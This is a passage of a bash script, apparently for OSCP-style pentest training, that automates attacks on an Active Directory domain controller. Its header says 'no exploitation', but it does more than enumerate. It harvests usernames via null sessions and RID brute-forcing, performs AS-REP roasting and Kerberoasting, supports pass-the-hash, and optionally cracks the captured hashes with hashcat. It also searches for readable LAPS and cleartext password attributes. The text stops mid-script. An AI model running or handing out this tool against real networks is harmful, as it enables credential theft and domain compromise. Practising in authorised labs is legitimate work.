#!/usr/bin/env bash
#
# ad-enum.sh — automated Active Directory enumeration from Kali (OSCP-oriented)
#
# Enumeration only: no password spraying, no exploitation, no lockout risk.
# Every command is one you would type by hand; the script just chains them,
# saves each output to its own file and greps the interesting bits at the end.
#
#   ./ad-enum.sh -i 192.168.50.70 -d corp.com
#   ./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -p 'Password123'
#   ./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -H 31d6cfe0d16ae931b73c59d7e0c089c0
#   ./ad-enum.sh -i 192.168.50.70 -d corp.com -u jdoe -p 'Password123' --crack
#
set -uo pipefail

# ---------------------------------------------------------------- defaults ---
DC_IP=""
DOMAIN=""
USER=""
PASS=""
NTHASH=""
OUTDIR=""
TIMEOUT=180
USERLIST=""          # -k : wordlist for kerbrute userenum (pre-auth, no lockout)
SWEEP=""             # -r : targets for the "where am I local admin" sweep
WORDLIST="/usr/share/wordlists/rockyou.txt"   # -w : cracking wordlist
DO_BH=1              # --no-bh    disables bloodhound-python
DO_SWEEP=1           # --no-sweep disables the local-admin sweep
DO_CRACK=0           # --crack    run hashcat on collected AS-REP / TGS hashes
DO_SPIDER=1          # --no-spider skip the share/SYSVOL file spider

C_RST=$'\e[0m'; C_B=$'\e[1m'; C_R=$'\e[31m'; C_G=$'\e[32m'; C_Y=$'\e[33m'; C_C=$'\e[36m'

usage() {
    cat <<EOF
${C_B}ad-enum.sh${C_RST} — automated AD enumeration

  -i <ip>        Domain Controller IP                       (required)
  -d <domain>    domain FQDN, e.g. corp.com                 (auto-detected if omitted)
  -u <user>      domain user for authenticated enumeration
  -p <pass>      password for -u
  -H <nthash>    NT hash instead of the password (pass-the-hash)
  -k <file>      username wordlist for kerbrute userenum
  -r <targets>   network for the local-admin sweep (default: the DC /24)
  -w <file>      wordlist for --crack        (default: ${WORDLIST})
  -o <dir>       output directory (default ./ad-enum-<domain>-<date>)
  -t <sec>       per-command timeout (default ${TIMEOUT})
  --crack        crack collected AS-REP / Kerberoast hashes with hashcat + -w
  --no-bh        skip bloodhound-python collection
  --no-sweep     skip the local-admin sweep (single credential, no lockout risk)
  --no-spider    skip the share / SYSVOL file spider
  -h             this help
EOF
    exit 0
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        -i) DC_IP="$2"; shift 2 ;;
        -d) DOMAIN="$2"; shift 2 ;;
        -u) USER="$2"; shift 2 ;;
        -p) PASS="$2"; shift 2 ;;
        -H) NTHASH="$2"; shift 2 ;;
        -k) USERLIST="$2"; shift 2 ;;
        -r) SWEEP="$2"; shift 2 ;;
        -w) WORDLIST="$2"; shift 2 ;;
        -o) OUTDIR="$2"; shift 2 ;;
        -t) TIMEOUT="$2"; shift 2 ;;
        --crack)     DO_CRACK=1; shift ;;
        --no-bh)     DO_BH=0; shift ;;
        --no-sweep)  DO_SWEEP=0; shift ;;
        --no-spider) DO_SPIDER=0; shift ;;
        -h|--help) usage ;;
        *) echo "unknown option: $1" >&2; exit 1 ;;
    esac
done

[[ -z "$DC_IP" ]] && { echo "missing -i <dc-ip>" >&2; exit 1; }

# ---------------------------------------------------------------- helpers ---
section() { printf '\n%s[=== %s ===]%s\n' "$C_B$C_C" "$1" "$C_RST"; }
info()    { printf '%s[*]%s %s\n' "$C_C" "$C_RST" "$1"; }
ok()      { printf '%s[+]%s %s\n' "$C_G" "$C_RST" "$1"; }
warn()    { printf '%s[!]%s %s\n' "$C_Y" "$C_RST" "$1"; }
err()     { printf '%s[-]%s %s\n' "$C_R" "$C_RST" "$1"; }

have() { command -v "$1" >/dev/null 2>&1; }

# impacket ships either as impacket-Foo or Foo.py depending on the install
impacket() {
    local tool="$1"
    if   have "impacket-$tool"; then echo "impacket-$tool"
    elif have "$tool.py";       then echo "$tool.py"
    else echo ""; fi
}
# path to the raw example script, needed to run it under the DNS shim
impacket_py() {
    local tool="$1" p
    for p in "/usr/share/doc/python3-impacket/examples/$tool.py" \
             "/usr/share/doc/python-impacket/examples/$tool.py" \
             "/usr/local/share/doc/impacket/examples/$tool.py"; do
        [[ -f "$p" ]] && { echo "$p"; return; }
    done
    command -v "$tool.py" 2>/dev/null
}

# Every credential ends up inside a command STRING that runcmd hands to bash -c.
# q() quotes a value so a password containing ' " $ ` ; or a space reaches the
# tool intact instead of breaking the quoting (or worse, running as a command).
q() { printf '%q' "$1"; }

# run() writes "# description" and "$ command" at the top of every output file.
# Findings must never grep those two lines, or the command text itself becomes a
# false positive ("-M laps" in the command line reading as "LAPS readable").
bodyof() {
    local f
    for f in "$@"; do [[ -f "$f" ]] && tail -n +4 "$f"; done
    return 0
}

# timeout(1) is coreutils on Kali; gtimeout on macOS; without either we just run
runcmd() {
    if   have timeout;  then timeout  "$TIMEOUT" bash -c "$1"
    elif have gtimeout; then gtimeout "$TIMEOUT" bash -c "$1"
    else bash -c "$1"; fi
}

N_OK=0; N_EMPTY=0; N_FAIL=0; N_SKIP=0; N_PART=0; N_TIME=0

# one RUN-LOG line. The note is squashed to a single line so the columns never
# break, however messy the tool's error text was.
logline() {
    local note="${4//$'\n'/ }"; note="${note//$'\r'/}"
    printf '%-5s %-24s %-54s %s\n' "$1" "$2" "$3" "${note:0:200}" >> "$OUTDIR/RUN-LOG.txt"
}

# skip <slug> <desc> <reason> — a check that could not even be attempted.
# This is the whole point: a missing tool must leave a trace, not a silent gap.
skip() {
    printf '  %s[SKIP]%s %-54s %s%s%s\n' "$C_Y" "$C_RST" "$2" "$C_B" "$3" "$C_RST"
    logline "SKIP" "$1" "$2" "$3"; ((N_SKIP++)); return 0
}

# run <slug> <description> <command string>
# Prints a verdict for every step: did it work, did it return nothing, was it
# refused, or did it authenticate but the module then errored (PART).
run() {
    local slug="$1" desc="$2" cmd="$3"
    local out="$OUTDIR/$slug.txt"
    { echo "# $desc"; echo "\$ $cmd"; echo; } > "$out"
    runcmd "$cmd" >> "$out" 2>&1
    local rc=$?

    local body lines status color note="" reason="" moderr=""
    body=$(tail -n +4 "$out")
    lines=$(grep -cvE '^\s*$' <<<"$body")

    # a module error that co-exists with a successful [+] auth line.
    # (a null/guest session that binds but cannot list shares is the EXPECTED
    #  answer on a hardened DC, not a partial run — so it is not listed here.)
    moderr=$(grep -m1 -hoiE 'operationsError|Broken pipe|STATUS_USER_SESSION_DELETED|Errno [0-9-]+ [A-Za-z].*|Name or service not known|unexpected exception|KRB_AP_ERR_SKEW|Traceback \(most recent' <<<"$body" | head -1)

    # explicit "this actually finished" markers — checked before any error line,
    # because tools like bloodhound-python print a harmless Kerberos-fallback
    # WARNING ("Name or service not known") and then complete successfully.
    local done_marker
    done_marker=$(grep -m1 -oiE 'Compressing output into|INFO: Done in|Domain dump finished|Enumeration output:|\[\*\] Saved .* to|wrote [0-9]+ bytes' <<<"$body")

    if [[ $rc -eq 124 ]]; then
        echo "[timeout after ${TIMEOUT}s]" >> "$out"
        status="TIME"; color="$C_Y"; note="killed after ${TIMEOUT}s — raise with -t"; ((N_TIME++))
    elif grep -qiE 'command not found|No such file or directory.*(nxc|bloody|kerbrute|impacket|certipy)' <<<"$body"; then
        status="SKIP"; color="$C_Y"; note="tool not installed"; ((N_SKIP++))
    elif grep -qE '^bash: -c: line [0-9]+:|^timeout: ' <<<"$body"; then
        status="FAIL"; color="$C_R"; note="the command string never ran (shell/timeout error)"; ((N_FAIL++))
    elif [[ -n "$done_marker" ]]; then
        status=" OK "; color="$C_G"; note="$lines line$([[ $lines -eq 1 ]] || echo s)"; ((N_OK++))
    elif grep -qE '\[\+\]|Pwn3d!|^dn:|^\$krb5|sAMAccountName:|Vulnerable|VULNERABLE' <<<"$body"; then
        # authenticated / produced records — but did the actual module finish?
        if [[ -n "$moderr" ]]; then
            status="PART"; color="$C_Y"; note="auth ok, module errored: $moderr"; ((N_PART++))
        else
            status=" OK "; color="$C_G"; note="$lines line$([[ $lines -eq 1 ]] || echo s)"; ((N_OK++))
        fi
    elif reason=$(grep -m1 -oiE 'STATUS_ACCESS_DENIED|ACCESS_DENIED|STATUS_LOGON_FAILURE|STATUS_ACCOUNT_LOCKED_OUT|STATUS_PASSWORD_EXPIRED|STATUS_NOT_SUPPORTED|invalid credentials|insufficientAccessRights|Insufficient access|operationsError|Operations error|strongerAuthRequired|Strong\(er\) authentication required|ldap_bind|Can.t contact LDAP server|KRB_AP_ERR_SKEW|KDC_ERR|Connection refused|No route to host|connection reset|timed out|Name or service not known|Traceback' <<<"$body") && [[ -n "$reason" ]]; then
        status="FAIL"; color="$C_R"; note="$reason"; ((N_FAIL++))
    elif [[ $lines -eq 0 ]]; then
        status="----"; color="$C_Y"; note="no results"; ((N_EMPTY++))
    elif [[ $rc -ne 0 ]]; then
        status="FAIL"; color="$C_R"; note="exit $rc"; ((N_FAIL++))
    else
        status=" OK "; color="$C_G"; note="$lines line$([[ $lines -eq 1 ]] || echo s)"; ((N_OK++))
    fi

    note="${note//$'\n'/ }"
    printf '  %s[%s]%s %-54s %s%s%s\n' "$color" "$status" "$C_RST" "$desc" "$C_B" "${note:0:120}" "$C_RST"
    logline "$status" "$slug" "$desc" "$note"
    return 0
}

# ldapsearch wrapper: authenticated when creds are available, anonymous otherwise
ldap_query() {
    local slug="$1" desc="$2" filter="$3" attrs="${4:-}"
    [[ -z "$BASEDN" ]] && return 0
    local auth="-x"
    if [[ -n "$USER" && -n "$PASS" ]]; then
        auth="-x -D $(q "$USER@$DOMAIN") -w $(q "$PASS")"
    fi
    run "$slug" "$desc" "ldapsearch -o ldif-wrap=no -LLL $auth -H ldap://$DC_IP -b '$BASEDN' '$filter' $attrs"
}

# --------------------------------------------------------------- pre-flight ---
section "PRE-FLIGHT"
for t in nxc ldapsearch rpcclient nmap dig smbclient; do
    have "$t" || warn "missing: $t (related checks will be skipped and logged as SKIP)"
done
for t in impacket-GetUserSPNs impacket-GetNPUsers bloodhound-python certipy-ad kerbrute hashcat bloodyAD; do
    have "$t" || warn "optional tool absent: $t"
done
have timeout || have gtimeout || \
    warn "timeout(1) not found: commands will run WITHOUT a time limit (install coreutils)"

# domain / hostname discovery — free, no credentials needed
SMBINFO=""; DC_NAME="${DC_NAME:-}"
if have nxc; then
    SMBINFO=$(TIMEOUT=60 runcmd "nxc smb $DC_IP" 2>&1)
    echo "$SMBINFO"
    [[ -z "$DOMAIN" ]] && DOMAIN=$(sed -n 's/.*(domain:\([^)]*\)).*/\1/p' <<<"$SMBINFO" | head -1)
    DC_NAME=$(sed -n 's/.*(name:\([^)]*\)).*/\1/p' <<<"$SMBINFO" | head -1)
    grep -qi 'signing:False' <<<"$SMBINFO" && warn "SMB signing disabled -> NTLM relay candidate"
fi
# the SMB banner is flaky over a lossy link; RootDSE dnsHostName is not.
if have ldapsearch; then
    RDSE=$(ldapsearch -o ldif-wrap=no -LLL -x -H "ldap://$DC_IP" -b '' -s base dnsHostName rootDomainNamingContext 2>/dev/null)
    RDSE_FQDN=$(sed -n 's/^dnsHostName: //p' <<<"$RDSE" | head -1)
    [[ -z "$DC_NAME" && -n "$RDSE_FQDN" ]] && DC_NAME="${RDSE_FQDN%%.*}"
    if [[ -z "$DOMAIN" && -n "$RDSE_FQDN" ]]; then
        DOMAIN="${RDSE_FQDN#*.}"
    fi
fi
[[ -z "$DOMAIN" ]] && { err "domain unknown: pass it with -d"; exit 1; }
[[ -n "$DOMAIN" ]] && ok "domain: $DOMAIN"
if [[ -n "$DC_NAME" ]]; then DC_NAME_KNOWN=1; ok "DC name: $DC_NAME"
else DC_NAME="dc"; DC_NAME_KNOWN=0; warn "DC short name unknown (banner + RootDSE both failed) — Kerberos by-name may fail"; fi
DC_FQDN="$DC_NAME.$DOMAIN"

# base DN from the domain name: corp.com -> dc=corp,dc=com
BASEDN="dc=$(sed 's/\./,dc=/g' <<<"$DOMAIN")"

OUTDIR="${OUTDIR:-./ad-enum-${DOMAIN}-$(date +%Y%m%d-%H%M%S)}"
mkdir -p "$OUTDIR"
# absolute from here on: some steps cd elsewhere (certipy, bloodhound) and a
# relative $OUTDIR / $DNSFIX would then point at nothing.
OUTDIR=$(cd "$OUTDIR" && pwd)
: > "$OUTDIR/RUN-LOG.txt"; rm -f "$OUTDIR"/*.hashes

info "DC        : $DC_IP ($DC_FQDN)"
info "Domain    : $DOMAIN"
info "Base DN   : $BASEDN"
info "Output    : $OUTDIR"
[[ -n "$USER" ]] && info "Auth as   : $DOMAIN\\$USER" || warn "no credentials: unauthenticated enumeration only"
echo "$SMBINFO" > "$OUTDIR/00-smb-banner.txt"

# ---- DNS shim: let Kerberos tools resolve the realm without touching /etc/hosts
DNSFIX="$OUTDIR/.dnsfix.py"
cat > "$DNSFIX" <<'PYEOF'
import sys, socket, runpy
IP = sys.argv[1]
NAMES = {n.strip().lower().rstrip('.') for n in sys.argv[2].split(',') if n.strip()}
SCRIPT = sys.argv[3]
def _m(h):
    if h is None: return None
    return IP if str(h).lower().rstrip('.') in NAMES else h
_gai = socket.getaddrinfo
socket.getaddrinfo = lambda h, *a, **k: _gai(_m(h), *a, **k)
_ghn = socket.gethostbyname
socket.gethostbyname = lambda h: IP if _m(h) == IP else _ghn(h)
_gnx = socket.gethostbyname_ex
socket.gethostbyname_ex = lambda h: (h, [], [IP]) if _m(h) == IP else _gnx(h)
_cc = socket.create_connection
socket.create_connection = lambda a, *x, **k: _cc((_m(a[0]), a[1]), *x, **k)
sys.argv = [SCRIPT] + sys.argv[4:]
runpy.run_path(SCRIPT, run_name="__main__")
PYEOF
# KRB_PREFIX + <full path to the example .py> + args  runs an impacket example
# with the realm/DC name resolving to the DC IP. Paths are baked in so the
# command string handed to `bash -c` needs no exported shell functions.
KRB_NAMES="$DOMAIN,$DC_FQDN,$DC_NAME,${DOMAIN^^},${DC_FQDN^^},${DC_NAME^^}"
KRB_PREFIX="python3 $(q "$DNSFIX") $DC_IP $(q "$KRB_NAMES")"
GETNP_PY=$(impacket_py GetNPUsers)
GETSPN_PY=$(impacket_py GetUserSPNs)

# ---- clock skew: query the DC's own clock over anonymous LDAP, compare, advise
SKEW=""
if have ldapsearch; then
    DCTIME=$(ldapsearch -o ldif-wrap=no -LLL -x -H "ldap://$DC_IP" -b '' -s base currentTime 2>/dev/null \
             | sed -n 's/^currentTime: \([0-9]\{14\}\).*/\1/p')
    if [[ -n "$DCTIME" ]]; then
        DC_EPOCH=$(date -u -d "${DCTIME:0:8} ${DCTIME:8:2}:${DCTIME:10:2}:${DCTIME:12:2}" +%s 2>/dev/null)
        NOW=$(date -u +%s)
        [[ -n "$DC_EPOCH" ]] && SKEW=$(( DC_EPOCH - NOW ))
    fi
fi
if [[ -n "$SKEW" ]]; then
    ABS=${SKEW#-}
    if [[ $ABS -le 120 ]]; then
        ok "clock skew vs DC: ${SKEW}s (Kerberos OK)"
    else
        warn "clock skew vs DC: ${SKEW}s — Kerberos (kerberoast, getTGT, nopac) WILL fail"
        SETTIME=$(date -u -d "${DCTIME:0:8} ${DCTIME:8:2}:${DCTIME:10:2}:${DCTIME:12:2}" '+%Y-%m-%d %H:%M:%S' 2>/dev/null)
        warn "  fix:  sudo date -u -s '${SETTIME}'    (or: sudo ntpdate $DC_IP ; sudo rdate -n $DC_IP)"
        warn "  the script auto-uses the AS-REP 'no-preauth' trick for kerberoast where possible"
    fi
fi
grep -qi "[[:space:]]$DOMAIN\([[:space:]]\|$\)" /etc/hosts || \
    warn "not in /etc/hosts (the script works around it):  $DC_IP  $DC_FQDN $DOMAIN"

# credential arguments reused by every tool below
NXC_AUTH=""; IMP_TARGET=""; SECRET_SET=0
NXC_G="--timeout 30 --dns-server $DC_IP"   # flaky link: give nxc room; resolve via the DC
if [[ -n "$USER" ]]; then
    if   [[ -n "$PASS"   ]]; then
        NXC_AUTH="-u $(q "$USER") -p $(q "$PASS") -d $(q "$DOMAIN")"
        IMP_TARGET=$(q "$DOMAIN/$USER:$PASS"); SECRET_SET=1
    elif [[ -n "$NTHASH" ]]; then
        NXC_AUTH="-u $(q "$USER") -H $(q "$NTHASH") -d $(q "$DOMAIN")"
        IMP_TARGET=$(q "$DOMAIN/$USER"); SECRET_SET=1
    fi
fi

# ------------------------------------------------------------------- ports ---
section "PORT SCAN"
if have nmap; then
    run "01-nmap" "targeted scan of the DC service ports" \
        "nmap -Pn -n -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 $DC_IP"
else
    skip "01-nmap" "targeted scan of the DC service ports" "nmap not installed"
fi

# --------------------------------------------------------------------- DNS ---
section "DNS (53)"
if have dig; then
    run "02-dns-axfr"  "zone transfer attempt" "dig axfr $DOMAIN @$DC_IP"
    run "02-dns-srv"   "SRV records (DCs, kerberos, ldap)" \
        "dig +short _ldap._tcp.dc._msdcs.$DOMAIN SRV @$DC_IP; dig +short _kerberos._tcp.$DOMAIN SRV @$DC_IP; dig +short _gc._tcp.$DOMAIN SRV @$DC_IP"
else
    skip "02-dns-axfr" "zone transfer attempt" "dig not installed"
fi

# --------------------------------------------------------------------- SMB ---
section "SMB (445)"
if have nxc; then
    run "03-smb-null-shares"  "shares via null session"  "nxc smb $DC_IP $NXC_G -u '' -p '' --shares"
    run "03-smb-guest-shares" "shares via guest account" "nxc smb $DC_IP $NXC_G -u 'guest' -p '' --shares"
    run "03-smb-rid-brute"    "users via RID brute (null session)" "nxc smb $DC_IP $NXC_G -u '' -p '' --rid-brute 4000"
    if [[ $SECRET_SET -eq 1 ]]; then
        run "04-smb-shares"    "shares (authenticated)"      "nxc smb $DC_IP $NXC_G $NXC_AUTH --shares"
        run "04-smb-users"     "domain users"                "nxc smb $DC_IP $NXC_G $NXC_AUTH --users"
        run "04-smb-groups"    "domain groups"               "nxc smb $DC_IP $NXC_G $NXC_AUTH --groups"
        run "04-smb-passpol"   "password policy"             "nxc smb $DC_IP $NXC_G $NXC_AUTH --pass-pol"
        run "04-smb-loggedon"  "logged-on users on the DC"   "nxc smb $DC_IP $NXC_G $NXC_AUTH --loggedon-users"
    fi
else
    skip "03-smb-null-shares" "SMB null/guest/rid enumeration" "nxc not installed"
fi
have smbclient && run "03-smbclient" "share list via smbclient (null)" "smbclient -N -L //$DC_IP" \
    || skip "03-smbclient" "share list via smbclient (null)" "smbclient not installed"
have enum4linux-ng && run "03-enum4linux-ng" "enum4linux-ng sweep" "enum4linux-ng -A $DC_IP" \
    || skip "03-enum4linux-ng" "enum4linux-ng sweep" "enum4linux-ng not installed (pipx install enum4linux-ng)"

# --------------------------------------------------------------------- RPC ---
section "RPC (135/139)"
if have rpcclient; then
    run "05-rpc-null" "rpcclient null session sweep" \
        "for q in srvinfo enumdomains enumdomusers enumdomgroups querydominfo getdompwinfo; do \
             echo \"--- \$q\"; rpcclient -U '' -N $DC_IP -c \"\$q\"; done"
else
    skip "05-rpc-null" "rpcclient null session sweep" "rpcclient not installed"
fi

# -------------------------------------------------------------------- LDAP ---
section "LDAP (389/636)"
if have ldapsearch; then
    run "06-ldap-rootdse" "RootDSE / naming contexts / DC time" \
        "ldapsearch -o ldif-wrap=no -LLL -x -H ldap://$DC_IP -b '' -s base namingContexts defaultNamingContext dnsHostName currentTime domainFunctionality"

    ldap_query "07-ldap-users"        "all users + descriptions" \
        "(&(objectClass=user)(objectCategory=person))" "sAMAccountName description userAccountControl memberOf lastLogonTimestamp pwdLastSet servicePrincipalName"
    ldap_query "07-ldap-groups"       "groups and members" \
        "(objectClass=group)" "sAMAccountName description member"
    ldap_query "07-ldap-computers"    "computers, OS and description" \
        "(objectClass=computer)" "name dNSHostName operatingSystem operatingSystemVersion description userAccountControl"
    # members of the privileged groups, resolved. nxc --groups only gives counts;
    # this names who is actually in Domain Admins / DnsAdmins / operators etc.
    ldap_query "07-ldap-privgroups"   "members of privileged groups (DA, EA, DnsAdmins, operators...)" \
        "(&(objectCategory=group)(|(cn=Domain Admins)(cn=Enterprise Admins)(cn=Administrators)(cn=Schema Admins)(cn=Account Operators)(cn=Backup Operators)(cn=Server Operators)(cn=Print Operators)(cn=DnsAdmins)(cn=Group Policy Creator Owners)))" \
        "cn member"
    ldap_query "08-ldap-spn"          "kerberoastable accounts (SPN set)" \
        "(&(objectClass=user)(objectCategory=person)(servicePrincipalName=*))" "sAMAccountName servicePrincipalName memberOf userAccountControl"
    ldap_query "08-ldap-asrep"        "AS-REP roastable (no pre-auth)" \
        "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" "sAMAccountName"
    ldap_query "08-ldap-unconstrained" "unconstrained delegation" \
        "(userAccountControl:1.2.840.113556.1.4.803:=524288)" "sAMAccountName dNSHostName"
    ldap_query "08-ldap-constrained"  "constrained delegation (incl. resource-based)" \
        "(|(msDS-AllowedToDelegateTo=*)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))" "sAMAccountName msDS-AllowedToDelegateTo msDS-AllowedToActOnBehalfOfOtherIdentity"
    ldap_query "08-ldap-admincount"   "protected/privileged objects (adminCount=1)" \
        "(adminCount=1)" "sAMAccountName memberOf"
    ldap_query "08-ldap-neverexpires" "password never expires" \
        "(&(objectClass=user)(objectCategory=person)(userAccountControl:1.2.840.113556.1.4.803:=65536))" "sAMAccountName"
    ldap_query "08-ldap-nopassreq"    "PASSWD_NOTREQD (blank password allowed)" \
        "(userAccountControl:1.2.840.113556.1.4.803:=32)" "sAMAccountName userAccountControl"
    ldap_query "08-ldap-gmsa"         "group managed service accounts (gMSA present?)" \
        "(objectClass=msDS-GroupManagedServiceAccount)" "sAMAccountName msDS-GroupMSAMembership"
    ldap_query "08-ldap-maq"          "ms-DS-MachineAccountQuota (can any user add a computer?)" \
        "(objectClass=domain)" "ms-DS-MachineAccountQuota"
    ldap_query "08-ldap-pw-in-attrs"  "cleartext-ish password attributes" \
        "(|(userPassword=*)(unixUserPassword=*)(unicodePwd=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*)(msLAPS-EncryptedPassword=*))" \
        "sAMAccountName name userPassword unixUserPassword ms-MCS-AdmPwd msLAPS-Password"
    ldap_query "09-ldap-trusts"       "domain trusts" \
        "(objectClass=trustedDomain)" "cn trustDirection trustAttributes trustType flatName"
    ldap_query "09-ldap-laps"         "LAPS passwords readable by us" \
        "(|(ms-Mcs-AdmPwd=*)(msLAPS-Password=*))" "name ms-Mcs-AdmPwd msLAPS-Password"
    ldap_query "09-ldap-gpo"          "GPOs" \
        "(objectClass=groupPolicyContainer)" "displayName gPCFileSysPath"
    # pKIEnrollmentService lives in the Configuration NC, not the domain NC
    LDAP_BIND="-x"
    [[ -n "$USER" && -n "$PASS" ]] && LDAP_BIND="-x -D $(q "$USER@$DOMAIN") -w $(q "$PASS")"
    run "09-ldap-adcs" "AD CS enrollment services (Configuration NC)" \
        "ldapsearch -o ldif-wrap=no -LLL $LDAP_BIND -H ldap://$DC_IP -b 'CN=Configuration,$BASEDN' '(objectClass=pKIEnrollmentService)' cn dNSHostName cACertificateDN"
else
    skip "06-ldap-rootdse" "all LDAP enumeration" "ldapsearch not installed (apt install ldap-utils)"
fi

if [[ $SECRET_SET -eq 1 ]] && have ldapdomaindump && [[ -n "$PASS" ]]; then
    mkdir -p "$OUTDIR/ldapdomaindump"
    run "10-ldapdomaindump" "ldapdomaindump (HTML report)" \
        "ldapdomaindump -u $(q "$DOMAIN\\$USER") -p $(q "$PASS") -o $(q "$OUTDIR/ldapdomaindump") ldap://$DC_IP"
elif have ldapdomaindump; then :; else
    skip "10-ldapdomaindump" "ldapdomaindump (HTML report)" "ldapdomaindump not installed"
fi

# ---------------------------------------------------------------- userlist ---
section "USER LIST"
USERS_FILE="$OUTDIR/users.txt"
{
    bodyof "$OUTDIR/07-ldap-users.txt"    | sed -n 's/^sAMAccountName: //p'
    bodyof "$OUTDIR/05-rpc-null.txt"      | sed -n 's/.*user:\[\([^]]*\)\].*/\1/p'
    bodyof "$OUTDIR/03-smb-rid-brute.txt" | sed -n 's/.*\\\(.*\) (SidTypeUser).*/\1/p'
    bodyof "$OUTDIR/04-smb-users.txt"     | awk '/-Username-/{f=1;next} /Enumerated .* users/{f=0} f{print $5}'
} | grep -vE '^[[:space:]]*$|\$$|^\[|^-Username-$' | sort -fu > "$USERS_FILE"
NUSERS=$(grep -c . "$USERS_FILE" 2>/dev/null || echo 0)
if [[ "$NUSERS" -gt 0 ]]; then ok "$NUSERS usernames harvested -> $USERS_FILE"
else warn "no usernames harvested from anonymous sources"; fi

# ---------------------------------------------------------------- KERBEROS ---
section "KERBEROS (88)"
KERB_INPUT=""
[[ -s "$USERS_FILE" ]] && KERB_INPUT="$USERS_FILE"
[[ -n "$USERLIST"   ]] && KERB_INPUT="$USERLIST"

if have kerbrute && [[ -n "$KERB_INPUT" ]]; then
    run "11-kerbrute" "username validation (pre-auth, no lockout)" \
        "kerbrute userenum -d $(q "$DOMAIN") --dc $DC_IP $(q "$KERB_INPUT")"
else
    skip "11-kerbrute" "username validation (pre-auth, no lockout)" \
        "$(have kerbrute || echo 'kerbrute not installed'; [[ -n "$KERB_INPUT" ]] || echo 'no user list')"
fi

# AS-REP roast is immune to clock skew (no PA-ENC-TIMESTAMP) — always try it
if [[ -n "$GETNP_PY" ]]; then
    if [[ $SECRET_SET -eq 1 && -n "$PASS" ]]; then
        run "12-asreproast" "AS-REP roasting (authenticated)" \
            "$KRB_PREFIX $(q "$GETNP_PY") $IMP_TARGET -dc-ip $DC_IP -request -format hashcat -outputfile $(q "$OUTDIR/asrep.hashes")"
    elif [[ -s "$USERS_FILE" ]]; then
        run "12-asreproast" "AS-REP roasting (from harvested users)" \
            "$KRB_PREFIX $(q "$GETNP_PY") $(q "$DOMAIN/") -usersfile $(q "$USERS_FILE") -dc-ip $DC_IP -no-pass -format hashcat -outputfile $(q "$OUTDIR/asrep.hashes")"
    fi
elif have "$(impacket GetNPUsers)"; then
    GNP=$(impacket GetNPUsers)
    [[ $SECRET_SET -eq 1 && -n "$PASS" ]] && run "12-asreproast" "AS-REP roasting (authenticated, no DNS shim)" \
        "$GNP $IMP_TARGET -dc-ip $DC_IP -request -format hashcat -outputfile $(q "$OUTDIR/asrep.hashes")"
else
    skip "12-asreproast" "AS-REP roasting" "impacket GetNPUsers not found"
fi

# who has no pre-auth — needed for the kerberoast fallback below
NOPREAUTH_USER=$(bodyof "$OUTDIR/08-ldap-asrep.txt" 2>/dev/null | sed -n 's/^sAMAccountName: //p' | head -1)
[[ -z "$NOPREAUTH_USER" ]] && NOPREAUTH_USER=$(bodyof "$OUTDIR/12-asreproast.txt" 2>/dev/null | sed -n 's/.*\$\([^$:@]*\)@.*/\1/p' | head -1)

if [[ -n "$GETSPN_PY" ]]; then
    SKEW_ABS=${SKEW#-}
    if [[ $SECRET_SET -eq 1 && -n "$PASS" && "${SKEW_ABS:-0}" -le 120 ]]; then
        run "13-kerberoast" "Kerberoasting (SPN ticket request)" \
            "$KRB_PREFIX $(q "$GETSPN_PY") $IMP_TARGET -dc-ip $DC_IP -dc-host $(q "$DC_FQDN") -request -outputfile $(q "$OUTDIR/tgs.hashes")"
    elif [[ -n "${SKEW_ABS:-}" && "${SKEW_ABS:-0}" -gt 120 ]]; then
        skip "13-kerberoast" "Kerberoasting (SPN ticket request)" \
            "clock skew ${SKEW}s breaks the TGT request — using the no-preauth fallback (13b)"
    fi
    # fallback / skew-immune path: roast the SPN accounts THROUGH an
    # AS-REP-roastable account. Its AS exchange carries no PA-ENC-TIMESTAMP, so
    # clock skew never enters into it. -no-preauth REQUIRES an explicit target list.
    ROAST_TARGETS="$OUTDIR/roast-targets.txt"
    bodyof "$OUTDIR/08-ldap-spn.txt" 2>/dev/null | sed -n 's/^sAMAccountName: //p' \
        | grep -viE '^krbtgt$' | sort -u > "$ROAST_TARGETS"
    if [[ -n "$NOPREAUTH_USER" && -s "$ROAST_TARGETS" ]] && ! grep -q '^\$krb5tgs' "$OUTDIR/tgs.hashes" 2>/dev/null; then
        run "13b-kerberoast-nopreauth" "Kerberoast via AS-REP account ($NOPREAUTH_USER, skew-immune)" \
            "$KRB_PREFIX $(q "$GETSPN_PY") -no-preauth $(q "$NOPREAUTH_USER") -usersfile $(q "$ROAST_TARGETS") $(q "$DOMAIN/") -dc-ip $DC_IP -request -outputfile $(q "$OUTDIR/tgs.hashes")"
    fi
else
    skip "13-kerberoast" "Kerberoasting" "impacket GetUserSPNs not found"
fi

# --------------------------------------------------------------- CRACKING ---
if [[ $DO_CRACK -eq 1 ]]; then
    section "OFFLINE CRACKING"
    if ! have hashcat; then
        skip "25-crack" "crack AS-REP / TGS hashes" "hashcat not installed"
    elif [[ ! -f "$WORDLIST" ]]; then
        skip "25-crack" "crack AS-REP / TGS hashes" "wordlist not found: $WORDLIST"
    else
        POT="$OUTDIR/hashcat.pot"
        for pair in "18200:asrep.hashes" "13100:tgs.hashes"; do
            m=${pair%%:*}; hf="$OUTDIR/${pair##*:}"
            [[ -s "$hf" ]] || continue
            run "25-crack-$m" "hashcat -m $m $(basename "$hf")" \
                "hashcat -m $m -a 0 $(q "$hf") $(q "$WORDLIST") --potfile-path $(q "$POT") -O -w3 --quiet; \
                 echo '--- cracked ---'; hashcat -m $m $(q "$hf") --potfile-path $(q "$POT") --show 2>/dev/null"
        done
    fi
fi

# ----------------------------------------------- RIGHTS, ACLs, LOCAL ADMIN ---
if [[ $SECRET_SET -eq 1 ]]; then

section "MY ACCOUNT"
ldap_query "15-whoami" "attributes of $USER (SPN? privileged groups? UAC flags?)" \
    "(sAMAccountName=$(printf '%s' "$USER" | sed 's/[()\\*]/\\&/g'))" \
    "sAMAccountName memberOf servicePrincipalName userAccountControl adminCount msDS-AllowedToDelegateTo description objectSid"

section "LDAP RIGHTS (authenticated)"
if have nxc; then
